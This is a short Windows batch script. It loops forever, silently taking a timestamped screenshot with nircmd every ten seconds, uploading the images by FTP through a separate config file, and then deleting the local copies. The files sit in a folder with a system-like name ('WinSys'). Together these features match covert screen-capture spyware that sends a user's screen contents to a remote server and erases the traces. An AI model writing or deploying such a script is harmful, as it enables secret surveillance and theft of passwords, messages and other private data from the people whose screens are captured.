@ECHO OFF
:Loop
timeout /T 10 /NOBREAK
C:\Users\Administrator\WinSys\ftp\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot C:\Users\Administrator\WinSys\ftp\cfg\scr~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.jpg
ftp -s:C:\Users\Administrator\WinSys\ftp\config.txt
timeout /T 10 /NOBREAK
del C:\Users\Administrator\WinSys\ftp\cfg\*.jpg
GOTO Loop